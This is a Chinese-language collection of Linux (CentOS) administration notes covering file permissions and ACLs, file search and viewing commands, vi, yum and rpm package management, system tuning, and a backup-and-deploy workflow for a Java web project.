-rwxrwxr-x 1 xyw xyw 27616196 11月 8 10:08 test3.zip

除去所有人对文件test3.zip的执行权限：chmod a-x test3.zip

更改后：

-rw-rw-r-- 1 xyw xyw 27616196 11月 8 10:08 test3.zip



经常使用的场景：对一个新建的shell脚本添加执行权限：chmod u+x test.sh



注意

目录的x权限代表的是用户能否进入该目录，用户没有一个目录的x权限就不能执行cd进入该目录。



![image-20210502144505200](https://www.m1yellow.cn/doc-img/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C%E8%AE%B0%E5%BD%95.assets/x-permission.png)



##### 父文件夹不开放权限，如何让其他用户有权限访问子文件夹内文件 ？

可以用acl权限去控制，用root或者zhu账号，给其他账号添加acl权限
setfacl -m u:账号:权限 文件
比如，让tom用户可以进/home/zhu下面，setfacl -m u:tom:rx /home/zhu ,但是这仅仅只限于zhu这个目录，对它下面的子目录无效，想子目录也生效，可以加上-R选项
setfacl -R -m u:tom:rx /home/zhu
上面指令只对现有目录/文件生效，想对以后新建的目录/文件也生效，需要在u前面加上d 即 setfacl -R -m d:u:tom:rx /home/zhu
具体更多用法，你可以看下帮助文档，比如删除单个用户的acl权限 setfacl -x ,删除所有-d ;查看一个文件/目录的acl权限 getfacl 文件/目录 等等

```shell
# 查看acl
getfacl test

# 添加acl，d-对以后新建的目录/文件也生效
setfacl -R -m d:u:dev0x01:rwx tomcat

# 清除所有acl
setfacl -b test
setfacl -R -b tomcat


```





##### 文件与目录的CRUD

新建文件

touch testfile

touch 这个命令最常被使用的情况是：

创建一个空的文件；

将某个文件日期修订为目前 (mtime 与 atime)



echo > testfile.txt

echo “This is some test words” > testfile.txt

新建目录

mkdir testfolder



删除文件

rm testfile.txt

rm -f testfile.txt 强制删除

删除目录

rmdir 删除一个空目录

rm -rf 递归强制删除



修改文件或目录名称

mv testfile.txt testfile2.txt

mv testfolder testfolder2



查找文件或目录

whereis、locate：从系统建立的文件数据库中查找，会出现不同步的情况，因为系统文件数据库不是实时更新，但可以手动执行更新[直接输入命令“updatedb”]

updatedb：根据 /etc/updatedb.conf 的配置去搜寻系统硬盘内的档名，并升级 /var/lib/mlocate 内的数据库文件；

locate：依据 /var/lib/mlocate 内的数据库记载，找出使用者输入的关键字档名。



find：直接读取硬盘数据文件进行查找，可以指定文件名称/类型、时间范围、文件属性



模糊查找文件

在当前目录下搜索指定文件：

find . -name test.txt



在当前目录下模糊搜索文件：

find . -name '*.txt'



在当前目录下搜索特定属性的文件：

find . -amin -10 # 查找在系统中最后10分钟访问的文件

find . -atime -2 # 查找在系统中最后48小时访问的文件

find . -empty # 查找在系统中为空的文件或者文件夹

find . -group cat # 查找在系统中属于 groupcat的文件

find . -mmin -5 # 查找在系统中最后5分钟里修改过的文件

find . -mtime -1 #查找在系统中最后24小时里修改过的文件

find . -nouser #查找在系统中属于作废用户的文件

find . -user fred #查找在系统中属于FRED这个用户的文件



在当前目录搜索文件内容含有某字符串（大小写敏感）的文件：

find . -type f | xargs grep 'your_string'



在当前目录搜索文件内容含有某字符串（大小写敏感）的特定文件：

find . -type f -name '*.sh' | xargs grep 'your_string'



在当前目录搜索文件内容含有某字符串（忽略大小写）的特定文件：

find . -type f -name '*.sh' | xargs grep -i 'your_string'



模糊查找指定文件并删除

find ./ -name 'localhost*.log'

find ./ -name 'localhost*.log' -exec rm {} \;

find ./ -name 'localhost*.log' | xargs rm -rf



##### 文件/目录特殊权限：SUID、SGID、SBIT

[文件与目录管理-文件特殊权限：SUID、SGID、SBIT](http://cn.linux.vbird.org/linux_basic/0220filemanager.php#suid_sgid_sbit)



- SUID：Set UID，设置在拥有者的`x`权限位，对二进制可执行程序有效（注意，shell 脚本无效），用来临时获取拥有者的执行权限。
- SGID：Set GID，设置在所在组的`x`权限位，对二进制可执行程序有效，用来临时获取所在组的执行权限。
- SBIT：Sticky Bit 粘性位，设置在其他人的`x`权限位，只对目录有效，文件无效，用来给目录加锁，只能是自己和root可以删除。



##### 文件搜寻

[文件与目录管理-命令与文件的搜寻](http://cn.linux.vbird.org/linux_basic/0220filemanager.php#file_find)



运行指令查找

witch

witch ifconfig



type



whereis

whereis ifconfig



文件查找

whereis



locate

从文件索引数据库中查找，新建的文件，需要收到刷新存入数据库



find

全盘检索，速度较慢



#### 文件操作

##### 文件内容查看

cat 从第一行开始显示

tac 从最后一行开始显示，可以看出 tac 是 cat 的倒序

nl  显示行号

more 逐页显示

less 与more类似，可以往前翻页

head 可以指定看开头几行

tail 可以指定看结尾几行

od  以二进制方式读取内容



head使用实例：

[root@study ~]# head /etc/man_db.conf

\# 預設的情況中，顯示前面十行！若要顯示前 20 行，就得要這樣：

[root@study ~]# head -n 20 /etc/man_db.conf

範例：如果後面100行的資料都不列印，只列印/etc/man_db.conf的前面幾行，該如何是好？（行数设置负数表示不现实）

[root@study ~]# head -n -100 /etc/man_db.conf



tail使用实例：

[root@study ~]# tail /etc/man_db.conf

\# 預設的情況中，顯示最後的十行！若要顯示最後的 20 行，就得要這樣：

[root@study ~]# tail -n 20 /etc/man_db.conf

範例一：如果不知道/etc/man_db.conf有幾行，卻只想列出100行以後的資料時？

[root@study ~]# tail -n +100 /etc/man_db.conf

範例二：持續偵測/var/log/messages的內容

[root@study ~]# tail -f /var/log/messages

-f 可以设置刷新频率，比如-200f表示每200ms刷新一次



综合实例：

要顯示 /etc/man_db.conf 的第 11 到第 20 行

head -n 20 /etc/man_db.conf | tail -n 10

如果再要显示行号呢

cat -n /etc/man_db.conf | head -n 20 | tail -n 10



**根据报错关键词定位日志前后几行**

linux系统中，利用grep打印匹配的上下几行



如果在只是想匹配模式的上下几行，grep可以实现。



$grep -5 'parttern' inputfile //打印匹配行的前后5行

**$grep -C 5 'parttern' inputfile //打印匹配行的前后5行**

$grep -A 5 'parttern' inputfile //打印匹配行的后5行

$grep -B 5 'parttern' inputfile //打印匹配行的前5行



查看mysql慢日志中ip地址为192.168.0.10发送过来的SQL语句的后面三行

tail -50 /usr/local/mysql/data/sql-slow.log |grep -3 '192.168.0.10' 

匹配php错误日志中某一个字段



　　2，tail -100 /data/logs/php/php_error_5.3.log | grep "Memcache::get()";



查看某一个文件第5行和第10行

 sed -n '5,10p' filename 这样你就可以只查看文件的第5行到第10行。



linux 如何显示一个文件的某几行(中间几行)



【一】从第3000行开始，显示1000行。即显示3000~3999行

cat filename | tail -n +3000 | head -n 1000



【二】显示1000行到3000行

cat filename| head -n 3000 | tail -n +1000



*注意两种方法的顺序

分解：

  tail -n 1000：显示最后1000行

  **tail -n +1000：从1000行开始显示，显示1000行以后的**

  head -n 1000：显示前面1000行



【三】用sed命令

 sed -n '5,10p' filename 这样你就可以只查看文件的第5行到第10行。

Linux统计文件行数

语法：wc [选项] 文件…



说明：该命令统计给定文件中的字节数、字数、行数。如果没有给出文件名，则从标准输入读取。wc同时也给出所有指定文件的总统计数。字是由空格字符区分开的最大字符串。

该命令各选项含义如下：

　　- c 统计字节数。

　　- l 统计行数。

　　- w 统计字数。

这些选项可以组合使用。



输出列的顺序和数目不受选项的顺序和数目的影响。

总是按下述顺序显示并且每项最多一列。

行数、字数、字节数、文件名

如果命令行中没有文件名，则输出中不出现文件名。



例如：

$ wc - lcw file1 file2



4 33 file1

7 52 file2

11 11 85 total



举例分析：

1.统计demo目录下，js文件数量：

find demo/ -name "*.js" |wc -l

2.统计demo目录下所有js文件代码行数：

find demo/ -name "*.js" |xargs cat|wc -l 或 wc -l `find ./ -name "*.js"`|tail -n1

3.统计demo目录下所有js文件代码行数，过滤了空行：

find /demo -name "*.js" |xargs cat|grep -v ^$|wc -l



由于日志文件较大，定位日志比较困难，因此可以使用一些Linux命令帮助快速定位。

查看日志可以使用less命令，打开文件： less 2017-11-05.log

进入文件后，输入斜线：/

直接输入搜索的内容，回车即可。

定位到内容可以按上下页查看附近的内容。

如果只是查看日志中是否存在该内容可以使用，如下命令，列出该文件中所有匹配的行：

grep '搜索的内容' --color 文件名称



vi文本编辑器内部搜索

在初始打开状态，输入/word（word为要搜索的词），/word为向下查找，?word为向上查找，可以配合n继续向下匹配，N继续向上匹配



##### 文件编辑

使用 vi 命令

vi编辑器是Linux系统下标准的编辑器.而且不逊色于其他任何最新的编辑器.可是会用的有多少呢.下面介绍一下vi编辑器的简单用法和部分命令.让你在Linux系统中畅行无阻.

基本上vi可以分为三种状态，分别是命令模式（command mode）、插入模式（Insert mode）和底行模式（last line mode）.

 

命令行模式command mode）控制屏幕光标的移动，字符、字或行的删除，移动复制某区段及进入Insert mode下，或者到 last line mode。   

插入模式（Insert mode）只有在Insert mode下，才可以做文字输入，按「i」键可进入模式，按「ESC」键可回到命令行模式。   

底行模式（last line mode）将文件保存或退出vi，也可以设置编辑环境，如寻找字符串、列出行号……等。   

不过一般我们在使用时把vi简化成两个模式，就是将底行模式（last line mode）也算入命令行模式command mode）。 

使用说明
    3.1 用"vi filename"命令进入vi命令行模式(vi filename). 如果要想编辑文本文件.必须要转换到插入模式下,也就是按一下键盘上的"i"就可以了.这样你就可以编辑文本,删除文本中的内容.按键盘上的上下左右键.来回移动了.就跟你在windows 系统中编辑文本一样.

3.2 输入你要输入的内容.如果你想退出文本编辑模式.并且保存刚刚编辑的文本.首先点击一下键盘上的"ESC",然后输入":wq!"这样就将文本保存了.然后推出了vi编辑器.如果不想保存就按一下键盘上的"ESC",输入":q!".如果你不确定是否成功.可以通过"cat filename" 命令来查看.

3.3 光标的移动除了键盘上的上下左右键.也可以是小写模式下,按键盘上的"h,j,k,l",

"ctrl+b":屏幕往后移动一页

"ctrl+f":屏幕往前移动一页

"ctrl+u":屏幕往后移动半页

"ctrl+d":屏幕往前移动半页

输入任何一个整数,然后输入"shift+G" 就可以到这一页的开头了.

按键盘上的大写"G"移动到文章的最后.

按"$"符号将光标移动到行尾

"^"将光标移到行头

"w":将光标移到下一行头

"b":跟"w"相反.移到上一行行头

"e":将光标移到下一行尾.

如果想让文本显示行号.就在命令行 模式下,在文本最后输入":set nu"命令.就可以了

3.4 复制

「yw」：将光标所在之处到字尾的字符复制到缓冲区中。 　　

「yy」：复制光标所在行到缓冲区。 　　

「#yy」：例如，「6yy」表示拷贝从光标所在的该行"往下数"6行文字。 　　

「p」：将缓冲区内的字符贴到光标所在位置。注意：所有与"y"有关的复制命令都必须与"p"配合才能完成复制与粘贴功能。

3.5 查找

用"/"加上要查找的内容.例如"/hello"或者是"?hello"也是可以的.

Linux中vi编辑器的使用详解

3.6 替换 　

「r」：替换光标所在处的字符。 ,按一下"r"然后输入要即可.　　「R」：替换光标所到之处的字符，直到按下「ESC」键为止。

3.7 恢复上一次操作 　

「u」：如果您误执行一个命令，可以马上按下「u」，回到上一个操作。按多次"u"可以执行多次恢复.就相当于"CTRL +Z"的操作



##### 文件切割

split 

常用比如 1000M 的文件，我只需要看最后的10M

split -d -b990m catalina.out aaa

split -d -b10000m catalina.out 20170604

截取的文件可以用重定向输入到新的文件中：

head -100 filename >a.txt

sed -n '4801845,5833926p' 2017060401 >log20170604



![image-20210502145005305](https://www.m1yellow.cn/doc-img/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C%E8%AE%B0%E5%BD%95.assets/split-usage.png)



#### vim 使用

- [Linux vi/vim](https://www.runoob.com/linux/linux-vim.html)



![img](https://www.m1yellow.cn/doc-img/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C%E8%AE%B0%E5%BD%95.assets/vi-vim-cheat-sheet-sch.gif)



##### 复制一行或多行

**复制**

```
1）单行复制
在命令模式下，将光标移动到将要复制的行处，按“yy”进行复制；
2）多行复制 在命令模式下，将光标移动到将要复制的首行处，按“nyy”复制n行；其中n为1、2、3……
```

**粘贴**

```
在命令模式下，将光标移动到将要粘贴的行处，按“p”进行粘贴
```



#### 相关补充

##### 为什么 centos7 默认没有安装 ifconfig 及 netstat

ifconfig 及 netstat 工具程序在 CentOS 5 及 6 的应用手册内被置标为降级已接近十年，而 Redhat 决定在 CentOS 7 不会缺省安装 net-tools 组件。其中一个转换的原因就是 ifconfig 不会显示界面卡所拥有的全部 IP 位置 —— 请改用 ip 指令。取而代之的工具是 ss 和 ip。假如你真的、真的很需要 ifconfig 和 netstat，你可执行 yum install net-tools。（https://www.baidu.com/link?url=Tk9wszCincHULNE_v23ylYFj_3HvMN_Vn5sUcvAkUbkM6mOGH65poLmEzI4uPm0-&wd=&eqid=947656b100010d74000000065f59cac7）



### 维护升级

#### 装完系统后要进行的优化

##### 配置国内 yum 源

首先备份

mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.bak



下载对应版本 repo 文件, 放入 /etc/yum.repos.d/

CentOS5 ：http://mirrors.163.com/.help/CentOS5-Base-163.repo

CentOS6 ：http://mirrors.163.com/.help/CentOS6-Base-163.repo

CentOS7 ：http://mirrors.163.com/.help/CentOS7-Base-163.repo

wget http://mirrors.163.com/.help/CentOS6-Base-163.repo

mv CentOS6-Base-163.repo CentOS-Base.repo



使用阿里云 yum 源

```shell
wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo
wget -O /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-8.repo


```



运行以下命令生成缓存

yum clean all

yum makecache

这一步还是比较耗时的，而且速度不快几k到几十k每秒之间，可以不执行。



除了网易之外，国内还有其他不错的 yum 源，比如中科大和搜狐。

中科大的 yum 源，安装方法查看：https://lug.ustc.edu.cn/wiki/mirrors/help/centos

sohu 的 yum 源安装方法查看: http://mirrors.sohu.com/help/centos.html



##### 系统更新

- [如何升级centos到最新版本](https://www.cnblogs.com/yanglang/p/10760490.html)



centos中“update”命令可以一次性更新所有软件到最新版本。
注意：不推荐使用update的y选项，-y选项会让你在安装每项更新前都进行确认（译者注：这样会非常费时间，更新进度忙）；
对于centos 5.X和6.X的系统我们在更新后需要重新安装应用程序恢复数据，庆幸的是centos7不需要这么麻烦，可以直接升级。为了安全起见，如果你有重要数据的话还是建议升级系统前做好备份。



以下是centos 7.X升级的步骤

检查系统版本
cat /etc/redhat-release
CentOS Linux release 7.9.2009 (Core)



检查可用更新

sudo yum check-update

```
Loaded plugins: fastestmirror
Determining fastest mirrors
base                                                                                                                                  | 3.6 kB  00:00:00     
docker-ce-stable                                                                                                                      | 3.5 kB  00:00:00     
epel                                                                                                                                  | 4.7 kB  00:00:00     
extras                                                                                                                                | 2.9 kB  00:00:00     
updates                                                                                                                               | 2.9 kB  00:00:00     
(1/5): extras/7/x86_64/primary_db                                                                                                     | 243 kB  00:00:00     
(2/5): epel/x86_64/updateinfo                                                                                                         | 1.0 MB  00:00:00     
(3/5): epel/x86_64/primary_db                                                                                                         | 7.0 MB  00:00:00     
(4/5): updates/7/x86_64/primary_db                                                                                                    |  10 MB  00:00:00     
(5/5): docker-ce-stable/7/x86_64/primary_db                                                                                           |  63 kB  00:00:00     

bind-export-libs.x86_64                                                    32:9.11.4-26.P2.el7_9.7                                           updates         
containerd.io.x86_64                                                       1.4.9-3.1.el7                                                     docker-ce-stable
docker-ce.x86_64                                                           3:20.10.8-3.el7                                                   docker-ce-stable
docker-ce-cli.x86_64                                                       1:20.10.8-3.el7                                                   docker-ce-stable
docker-ce-rootless-extras.x86_64                                           20.10.8-3.el7                                                     docker-ce-stable
kernel.x86_64                                                              3.10.0-1160.41.1.el7                                              updates         
kernel-devel.x86_64                                                        3.10.0-1160.41.1.el7                                              updates         
kernel-headers.x86_64                                                      3.10.0-1160.41.1.el7                                              updates         
kernel-tools.x86_64                                                        3.10.0-1160.41.1.el7                                              updates         
kernel-tools-libs.x86_64                                                   3.10.0-1160.41.1.el7                                              updates         
kpartx.x86_64                                                              0.4.9-135.el7_9                                                   updates         
microcode_ctl.x86_64                                                       2:2.1-73.11.el7_9                                                 updates         
openldap.x86_64                                                            2.4.44-24.el7_9                                                   updates         
python-perf.x86_64                                                         3.10.0-1160.41.1.el7                                              updates         
virt-what.x86_64                                                           1.18-4.el7_9.1                                                    updates
```



备份重要数据（例如/etc, /var,/opt）

如果centos是安装在虚拟机上，那么可以使用快照进行备份。像VMware虚拟机可以快照备份，当然更奢侈一点是备份整个虚拟机。也可以针对重要程序数据进行备份，例如MySQL, Appache, Nginx, DNS等等。



运行yum命令升级
sudo yum clean all
sudo yum update

sudo yum makecache



重启系统
sudo reboot



查看现在系统版本
cat /etc/redhat-release
CentOS Linux release 7.9.2009 (Core)



#### 软件管理

##### rpm

rpm（英文全拼：redhat package manager） 原本是 Red Hat Linux 发行版专门用来管理 Linux 各项套件的程序，由于它遵循 GPL 规则且功能强大方便，因而广受欢迎。逐渐受到其他发行版的采用。RPM 套件管理方式的出现，让 Linux 易于安装，升级，间接提升了 Linux 的适用度。



##### 查询

rpm -q tomcat



选项与参数：

查询已安装软件的资讯：

-q ：仅查询，后面接的软件名称是否有安装；

-qa ：列出所有的，已经安装在本机 Linux 系统上面的所有软件名称；

-qi ：列出该软件的详细资讯 (information)，包含开发商、版本与说明等；

-ql ：列出该软件所有的文件与目录所在完整档名 (list)；

-qc ：列出该软件的所有配置档 (找出在 /etc/ 底下的档名而已)

-qd ：列出该软件的所有说明档 (找出与 man 有关的文件而已)

-qR ：列出与该软件有关的相依软件所含的文件 (Required 的意思)

-qf ：由后面接的文件名称，找出该文件属於哪一个已安装的软件；

查询某个 RPM 文件内含有的资讯：

-qp[icdlR]：注意 -qp 后面接的所有参数以上面的说明一致。但用途仅在於找出

​      某个 RPM 文件内的资讯，而非已安装的软件资讯！注意！



##### 默认安装的路径

/var/lib/rpm/



##### 安装

rpm -ivh package_name



选项与参数：

-i ：install 的意思

-v ：察看更细部的安装资讯画面

-h ：以安装资讯列显示安装进度



多个软件安装

rpm -ivh a.i386.rpm b.i386.rpm *.rpm



网络安装

rpm -ivh http://website.name/path/pkgname.rpm



##### 更新

rpm -Uvh package_name

rpm -Fvh package_name



-Uvh 后面接的软件即使没有安装过，则系统将予以直接安装； 若后面接的软件有安装过旧版，则系统自动升级至新版

-Fvh 如果后面接的软件并未安装到你的 Linux 系统上，则该软件不会被安装；亦即只有已安装至你 Linux 系统内的软件会被升级（可能会导致新功能用不了）



##### 校验

rpm -Va

rpm -V 已安装的软件名称

rpm -Vp 某个 RPM 文件的档名

rpm -Vf 在系统上面的某个文件



选项与参数：

-V ：后面加的是软件名称，若该软件所含的文件被更动过，才会列出来；

-Va ：列出目前系统上面所有可能被更动过的文件；

-Vp ：后面加的是文件名称，列出该软件内可能被更动过的文件；

-Vf ：列出某个文件是否被更动过～



范例一：列出你的 Linux 内的 logrotate 这个软件是否被更动过？

[root@www ~]# rpm -V logrotate

\# 如果没有出现任何信息，恭喜你，该软件所提供的文件没有被更动过。

\# 如果有出现任何信息，才是有出现状况啊！



范例二：查询一下，你的 /etc/crontab 是否有被更动过？

[root@www ~]# rpm -Vf /etc/crontab

S.5....T c /etc/crontab

\# 因为有被更动过，所以会列出被更动过的资讯类型！



SM5DLUGT c filename



S ：(file Size differs) 文件的容量大小是否被改变

M ：(Mode differs) 文件的类型或文件的属性 (rwx) 是否被改变？如是否可运行等参数已被改变

5 ：(MD5 sum differs) MD5 这一种指纹码的内容已经不同

D ：(Device major/minor number mis-match) 装置的主/次代码已经改变

L ：(readLink(2) path mis-match) Link 路径已被改变

U ：(User ownership differs) 文件的所属人已被改变

G ：(Group ownership differs) 文件的所属群组已被改变

T ：(mTime differs) 文件的创建时间已被改变



c 代表的是『 Config file 』的意思，也就是文件的类型，文件类型有底下这几类：



c ：配置档 (config file)

d ：文件数据档 (documentation)

g ：鬼文件～通常是该文件不被某个软件所包含，较少发生！(ghost file)

l ：授权文件 (license file)

r ：读我文件 (read me)



##### 签名





##### 卸载

找出与 pam 有关的软件名称，并尝试移除 pam 这个软件：

[root@www ~]# rpm -qa | grep pam

pam-devel-0.99.6.2-3.27.el5

pam_passwdqc-1.0.2-1.2.2

pam_pkcs11-0.5.3-23

pam_smb-1.1.7-7.2.1

pam-0.99.6.2-3.27.el5

pam_ccreds-3-5

pam_krb5-2.2.14-1

[root@www ~]# rpm -e pam

error: Failed dependencies:

​    libpam.so.0 is needed by (installed) coreutils-5.97-14.el5.i386

​    libpam.so.0 is needed by (installed) libuser-0.54.7-2.el5.5.i386

....(以下省略)....



若仅移除 pam-devel 这个之前范例安装上的软件呢？

[root@www ~]# rpm -e pam-devel

[root@www ~]# rpm -q pam-devel

package pam-devel is not installed



由于 RPM 文件常常会安装/移除/升级等，某些动作或许可能会导致 RPM 数据库 /var/lib/rpm/ 内的文件破损。可以使用 --rebuilddb 这个选项来重建一下数据库：



[root@www ~]# rpm --rebuilddb



##### yum

yum（ Yellow dog Updater, Modified）是一个在 Fedora 和 RedHat 以及 SUSE 中的 Shell 前端软件包管理器。



基于 RPM 包管理，能够从指定的服务器自动下载 RPM 包并且安装，可以自动处理依赖性关系，并且一次安装所有依赖的软体包，无须繁琐地一次次下载、安装。



列出所有可更新的软件清单

yum check-update



更新所有软件

yum update



仅安装指定的软件

yum install package_name



仅更新指定的软件

yum update package_name



列出所有可安裝的软件清单

yum list



列出以 pam 为开头的软件

yum list pam*



删除软件包

yum remove package_name



查找软件包

yum search keyword



清除缓存

yum clean packages: 清除缓存目录下的软件包

yum clean headers: 清除缓存目录下的 headers

yum clean oldheaders: 清除缓存目录下旧的 headers

yum clean, yum clean all (= yum clean packages; yum clean oldheaders) :清除缓存目录下的软件包及旧的 headers



> 应用、系统更新流程

```shell
# 清理缓存信息
yum clean all

# 安装所有软件和系统更新
yum -y update

# 系统更新后需要重启
reboot

```



#### Error: rpmdb open failed

使用yum安装软件时出现Error: rpmdb open failed，报错信息显示rpm数据库被损坏。

```shell
[root@VM-0-7-centos dvlp]# yum clean all
error: rpmdb: BDB0113 Thread/process 15933/140093127161920 failed: BDB1507 Thread died in Berkeley DB library
error: db5 error(-30973) from dbenv->failchk: BDB0087 DB_RUNRECOVERY: Fatal error, run database recovery
error: cannot open Packages index using db5 -  (-30973)
error: cannot open Packages database in /var/lib/rpm
CRITICAL:yum.main:

Error: rpmdb open failed
[root@VM-0-7-centos dvlp]# yum mackecache
error: rpmdb: BDB0113 Thread/process 15933/140093127161920 failed: BDB1507 Thread died in Berkeley DB library
error: db5 error(-30973) from dbenv->failchk: BDB0087 DB_RUNRECOVERY: Fatal error, run database recovery
error: cannot open Packages index using db5 -  (-30973)
error: cannot open Packages database in /var/lib/rpm
CRITICAL:yum.main:

Error: rpmdb open failed

```



需要重建rpm数据库。

```shell
[root@www~]# cd /var/lib/rpm                  # rpmdb所在目录
[root@www rpm]# rm -f __db.*                  # 清除原rpmdb文件
[root@www rpm]# rpm --rebuilddb               # 重建rpm数据库
[root@www rpm]# yum clean all                 # 清除所有yum的缓存

```



#### 复制虚拟机上网问题

虚拟机上克隆后网络不通解决办法：

由于克隆虚拟机，vmware只是修改了虚拟机的名字等信息，并没有修改虚拟硬盘中的任何信息，导致克隆后网卡的MAC地址和操作系统中记录的mac地址 不符，导致eth0启动不起来。操作系统记录了一个新网卡的添加，新网卡的名字eth1，mac地址就是vmware分配给的新的mac地址 



解决方法： 

修改 vim /etc/udev/rules.d/70-persistent-net.rules 文件

删除掉 关于 eth0 的信息。修改 第二条 eth1 的网卡的名字为 eth0. 



修改vim /etc/sysconfig/network-scripts/ifcfg-eth0 中mac地址为 /etc/udev/rules.d/70-persistent-net.rules 修改后的eth0的mac地址。



#### 修改主机名

**CentOS 6修改 hostname**

```shell
临时生效：
[root@centos6 ~]$ hostname centos66.magedu.com    # 设置当前的hostname(立即生效，临时的，重启恢复）
永久生效：
第一步
[root@centos6 ~]$ hostname                      # 查看当前的hostnmae
centos6.magedu.com
[root@centos6 ~]$ vim /etc/sysconfig/network        # 编辑network文件修改hostname行（重启生效）
[root@centos6 ~]$ cat /etc/sysconfig/network         # 检查修改
NETWORKING=yes
HOSTNAME=centos66.magedu.com
第二步
[root@centos6 ~]$ vim /etc/hosts  # 编辑hosts文件，给127.0.0.1添加hostname，也可以只保留一个主机名
[root@centos6 ~]$ cat /etc/hosts                    # 检查
127.0.0.1 localhost localhost.localdomain localhost4 localhost4.localdomain4 centos66.magedu.com
::1 localhost localhost.localdomain localhost6 localhost6.localdomain6

```



**CentOS 7 修改 hostname**

```shell
[root@centos7 ~]$ hostnamectl set-hostname centos77.magedu.com             # 使用这个命令会立即生效且重启也生效
[root@centos7 ~]$ hostname                                                 # 查看下
centos77.magedu.com
[root@centos7 ~]$ vim /etc/hosts                                           # 编辑下hosts文件， 给127.0.0.1添加hostname
[root@centos7 ~]$ cat /etc/hosts                                           # 检查
127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4 centos77.magedu.com
::1         localhost localhost.localdomain localhost6 localhost6.localdomain6

```



#### 忘记密码解决方法

[CentOS7忘记root密码，重置root密码](https://blog.csdn.net/gnail_oug/article/details/94721777)



#### 解决 free -m 下 buff/cache 缓存很高

https://www.cnblogs.com/aqicheng/p/11464611.html



free -m 命令查询当前内存使用情况，单位M

echo 1 > /proc/sys/vm/drop_caches :表示清除pagecache。
echo 2 > /proc/sys/vm/drop_caches :表示清除回收slab分配器中的对象（包括目录项缓存和inode缓存）。slab分配器是内核中管理内存的一种机制，其中很多缓存数据实现都是用的pagecache。
echo 3 > /proc/sys/vm/drop_caches :表示清除pagecache和slab分配器中的缓存对象。



#### rsyslogd 内存占用很高解决方案

- [rsyslogd内存占用很高解决方案](https://www.kaisawind.com/2019/09/25/2019-09-25-linux2/)

- [Centos7中systemd-journald占用内存过高问题](https://www.cnblogs.com/JerryTomcat/p/14742086.html)



```shell
# 修改 rsyslogd 服务配置文件
sudo vim /usr/lib/systemd/system/rsyslog.service

# 在 [Service] 下新增
MemoryAccounting=yes
MemoryMax=80M
MemoryHigh=8M

# 通常情况下rsyslogd大小只有5M，所以将内存上限设置为8M，然后将绝对内存限制为80M。

# 重启服务
systemctl daemon-reload
systemctl restart rsyslog

# 根本原因
# 查看rsyslog输出的日志/var/log/

发现/var/log/messages有几个G的日志。查看日志内容发现rsyslog把Journal的log都进行的输出和汇总。
当容器越多是，log也就会也多，内存占用也就越多。

消减输出的日志，将log级别定义为err级别

修改rsyslogd配置文件

sudo vim /etc/rsyslog.conf

*.err;mail.none;authpriv.none;cron.none /var/log/messages

重启服务
systemctl daemon-reload
systemctl restart rsyslog


# 修改Journal的配置/etc/systemd/journald.conf
grep -i storage /etc/systemd/journald.conf
Storage=none

systemctl restart systemd-journald


```



#### 使用网线共享另一台电脑的 WiFi 网络

为什么要这样做？物理机直接安装的 centos，因为无线网卡驱动不支持，手动编译安装驱动过于复杂，还不稳定。

为什么不直接用网线连路由器？走线不方便啊，要将近10米的网线，还要从门缝了进，各种贴胶布固定。

脑子里突然想到，用一根网线连接两台电脑，共享网络。于是到网上搜了一下，果然有这种“骚”操作，哈哈哈。

实验了一下，果然可用！哈哈，省去了重新装系统、装虚拟机的时间。



参考：

- [一个笔记本能连WiFi 通过网线共享网络给另一个电脑上网](https://blog.csdn.net/gong842087571/article/details/105991740)



#### 重置系统为初始安装状态

有时候，想安装使用一个软件或功能，需要安装各种编译环境和依赖，“一顿操作猛如虎”，结果却没有作用！没得到想要的结果，反而产生了一大堆不需要的垃圾文件和依赖。基本上都不知道是干什么用的，甚至还占用系统性能资源，影响正常使用！



查了一下，目前好像没有可行方案。



## 开发实战

### 云服务器部署

#### 重置实例密码



#### RAM 子账户




#### 使用 xshell 远程登录

查看 ECS 服务器初始默认开放的端口：

```shell
netstat -lntp
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1003/sshd           
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      979/master          
tcp6       0      0 ::1:25                  :::*                    LISTEN      979/master

```



#### 创建特定开发用户
线上项目尽可能使用普通用户运行，除特殊软件程序安装需要临时 root 权限。
普通用户可以对应项目，也可以对应开发人员。


### 项目更新流程以及相关命令

这里所有的实例基于项目目录 /home/wwwroot/sp2p

注意：首次部署删除打包后的源码

注意：检查jdk 版本是否与本地jdk版本一致

备份文件在 /home/back/

1.1 本地使用好压将要更新的内容打包成 tar.gz 包。

1.2 备份服务器程序文件

程序备份 

找到tomcat路径 ps aux|grep tomcat

查看项目路径 cat “Tomcatpath”/conf/server.xml

找到项目路径

cd /home/wwwroot/sp2p/WEB-INF/application/

tar -zcvf precompiled2016****.tar.gz precompiled 

整站备份

cd /home/wwwroot/

tar -zcf sp2p2016****.tar.gz sp2p



1.3 备份服务器数据库。

命令

mysqldump -u[1] -p[2] --set-charset --single-transaction --default-character-set=utf8 --disable-keys -c --no-autocommit --triggers -R [3] >[4]

其中

[1] mysql用户名

[2] mysql密码

[3] 需要备份的具体数据库名称

[4] 备份产生的数据库文件

如：

mysqldump -uroot -proot --set-charset --single-transaction --default-character-set=utf8 --disable-keys -c --no-autocommit --triggers -R sp2p_shjs > sp2p_shjs20160505.sql



注意：有些服务器没有装mysql数据库的，是没法使用命令的，可以使用工具备份后上传至服务器。如果IP非127.0.0.1 或localhost 需要在mysqldump 添加 -h 



1.4 上传文件，并解压

解压命令

cd /home/wwwroot/sp2p/WEB-INF/application/

tar -zxvf precomplied.tar.gz

（解压到指定目录：tar -zxvf precomplied.tar.gz -C 指定目录）

上传文件如果出现错误，服务也是我们的，尝试把文件上传至

/home/usersp2p 

再使用 mv 命令移动至需要的目录 如： mv /home/usersp2p/WEB-INF.tar.gz ./

最后使用./ 必须先cd至你需要的目录

修改文件（夹）所属者：chown root:root application.tar.gz

